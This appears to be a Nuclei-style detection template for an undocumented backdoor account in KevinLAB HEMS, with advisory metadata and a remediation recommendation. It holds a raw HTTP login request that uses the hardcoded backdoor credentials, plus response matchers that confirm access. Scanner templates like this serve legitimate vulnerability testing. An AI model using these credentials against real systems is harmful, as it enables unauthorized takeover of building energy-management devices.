id: kevinlab-hems-backdoor
info:
  name: KevinLAB HEMS - Backdoor Detection
  author: gy741
  severity: critical
  description: KevinLAB HEMS has an undocumented backdoor account that provides an
    attacker with full system control and cannot be changed through normal operations.
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
  tags: kevinlab,default-login,backdoor
  metadata:
    impact: The presence of an undocumented backdoor account in KevinLAB HEMS could
      lead to a complete compromise of system security and control by an attacker.
    recommendation: I highly recommend addressing the vulnerability in KevinLAB HEMS
      by removing the undocumented backdoor account and credential sets to prevent
      potential exploitation and unauthorized access to the system.
requests:
- raw:
  - 'POST /dashboard/proc.php?type=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept-Encoding: gzip, deflate

    Connection: close


    userid=kevinlab&userpass=kevin003

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <meta http-equiv="refresh" content="0; url=/"></meta>
  - type: word
    words:
    - <script> alert
    negative: true
  - type: word
    part: header
    words:
    - PHPSESSID
  - type: status
    status:
    - 200
